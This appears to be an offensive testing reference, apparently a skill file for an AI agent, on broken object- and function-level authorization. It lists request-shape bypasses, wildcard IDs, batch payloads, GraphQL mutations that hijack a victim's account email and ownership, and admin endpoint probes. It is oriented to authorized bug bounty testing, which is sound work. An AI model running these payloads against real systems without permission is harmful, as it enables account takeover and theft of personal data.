# Authorization Edge Cases — BOLA / IDOR / BFLA

> Basic ID swap is the tutorial. Real payouts live in the shapes scanners do not try: wrapped objects,
> arrays, batches, special IDs, write mutations, alternate artifacts and the last step of a multi-step flow.

Use two owned accounts (A attacker, B victim), ideally different tenants, plus a low-privilege identity for
vertical tests. Prove the boundary with the foreign object's content, not a status code.

See also `skills/johnwick/references/authz-idor.md` and
`skills/omni-killchain/references/idor-bola-mass-assignment.md` for the per-verb/status-sibling method.

---

## 1. The non-negotiable proof (all three)

1. Baseline: A's request returns **A's** object.
2. Cross probe: same request shape, B's ID, still A's session, returns **B's** object (not 403/empty).
3. Body proof: response contains B's identifiers (email/name/amount/order_id) — not just a 200.

If any is missing, it is not IDOR. `200 OK` is not proof.

---

## 2. Request-shape matrix

Test the **same object** through every shape before concluding it is protected.

| Shape | Example | Why it bypasses |
|---|---|---|
| Path | `/api/orders/456` | baseline |
| Query | `/api/orders?id=456` | different handler/authz |
| Body | `{"id":456}` | handler reads body, auth reads path |
| Nested/wrapped | `{"Account":{"Account":456}}` | outer key checked, inner executed |
| Array | `id[]=mine&id[]=456` | auth checks first/only scalar |
| JSON array | `{"ids":["mine","456"]}` | per-item auth missing |
| Batch | `POST /api/batch {"ids":["mine","456"]}` | first-item check |
| Duplicate key | `{"id":mine,"id":456}` | auth first, handler last |
| Duplicate param | `id=mine&id=456` | parser first/last mismatch |
| Special value | `*`, `all`, `0`, `-1`, `null`, empty | ownership clause skipped |
| Method | PUT/PATCH/DELETE/HEAD/OPTIONS | per-verb authz gap |
| Version | `/v1/` vs `/v2/` | older route weaker |
| Representation | `.json`, `?format=json`, `Accept: application/json` | serializer/authz gap |
| Artifact | `/export`, `/download`, `.pdf`, `.zip` | secondary path unscoped |
| Alternate host | legacy/internal/mobile API host | separate edge config |
| GraphQL | `node(id:)`, nested field, **mutation** | resolver-level gap |
| WebSocket | frame with `userId`/`conversationId` | handshake auth only |

---

## 3. Nested / wrapped objects

```
baseline:  {"Account": 1111}
wrapped:   {"Account": {"Account": 3333}}
also:      {"user": {"id": victim}}
           {"data": {"object": {"id": victim}}}
```

The middleware validates the top-level key; business logic follows the nested object. Scanners almost never
test this shape. Watch for type coercion (`"1111"` vs `1111`), arrays of objects, and extra nesting levels.

## 4. Batch / bulk / array mixing

```
POST /api/batch        {"ids": ["mine", "victim"]}
GET  /api/items?id[]=mine&id[]=victim
POST /api/bulk-update  [{"id":"mine"},{"id":"victim"}]
```

Look for: partial-success responses that leak existence, per-item error messages, first-item-only
authorization, and bulk delete/restore/move endpoints. Test read **and** write.

## 5. Special and wildcard IDs

```
/api/users/*
/api/users/all
/api/users/any
/api/users/0
/api/users/-1
/api/users/null
/api/users/            (empty)
?id[]=
```

Some ORMs/backends interpret these as "all" or skip the ownership predicate. High impact when it returns a
list or enables bulk modification. Also try `%2A`, `＊`, and path traversal (`../users/victim`).

## 6. GraphQL write operations

Queries are often protected; mutations are not.

```graphql
mutation { updateUser(id: "victim", input: {email: "attacker@evil.com"}) { id email } }
mutation { deleteX(id: "victim") { id } }
mutation { transferOwnership(from: "victim", to: "me") { id } }
mutation { batchUpdate(ids: ["me", "victim"]) { id } }
```

Also test unauthenticated mutations, aliases that repeat a mutation many times, nested input objects, and
field-level gaps where the top resolver checks auth but a deprecated/nested field does not.

## 7. State, artifact and representation

- **State-conditioned**: draft / preview / pending / archived / shared / deleted / expired may serialize
  differently. Compare visibility for the same owned object across states.
- **Invitation-state**: `invited/pending/accepted/expired/revoked` membership can expose resource
  titles/metadata before authorization completes.
- **Artifact equivalence**: page vs JSON vs export vs download vs PDF vs ZIP vs attachment. The export/
  download path is frequently weaker.
- **Deletion residue**: deleted object may remain in exports, attachments, CDN URLs, email/notification
  copies, search indexes.
- **Last-step gap**: preview/create is authorized; `confirm`, `commit`, `publish`, `transfer`, `approve`
  is not. Replay the final request with a lower-privileged identity.

## 8. Vertical (BFLA) tests

- Call admin/internal endpoints with a normal account: `/admin/*`, `/internal/*`, `/manage/*`, `/api/admin/*`.
- Test function-level siblings: if `GET /admin/users` is blocked, try `POST`, `PUT`, `DELETE`, `/export`.
- Role fields: `role`, `is_admin`, `permissions`, `tenant_id`, `owner_id`, `plan`, `entitlement` via mass
  assignment on update/profile/create.
- Entitlement checks are often UI-only: after downgrade/cancel, call the premium action directly.

## 9. Escalation

```
read foreign object        -> Medium/High depending on data
write foreign object       -> High (integrity)
cross-tenant read/write    -> High/Critical
admin BFLA                 -> Critical if user-data scope
IDOR email/UUID + reset    -> ATO (Critical)
IDOR + export/enumeration  -> quantify PII at scale (Critical)
```

Quantify with a small sample and a count estimate; never dump the full range.

## 10. False-positive gate

- You read your own data (self-IDOR).
- The "foreign" object is public by design (shared link, public profile).
- A 200 returns an empty/placeholder object or a generic success JSON.
- The endpoint is intentionally multi-tenant (staff/admin cross-tenant view).
- A UUID is non-guessable and you obtained it only from a public page that is meant to expose it.
- The response is a WAF/block/SPA shell, not the object.

## 11. Evidence checklist

- [ ] Two owned identities, roles and tenants recorded.
- [ ] Baseline + cross probe + reverse probe.
- [ ] Negative control (a sibling that correctly denies).
- [ ] Body diff shows the foreign identifier.
- [ ] Every verb tested separately (read/update/delete/export).
- [ ] 200-only findings discarded.
- [ ] Minimum data captured; no enumeration dump.
- [ ] Root cause stated (missing ownership / wrong subject / per-item gap / stale role).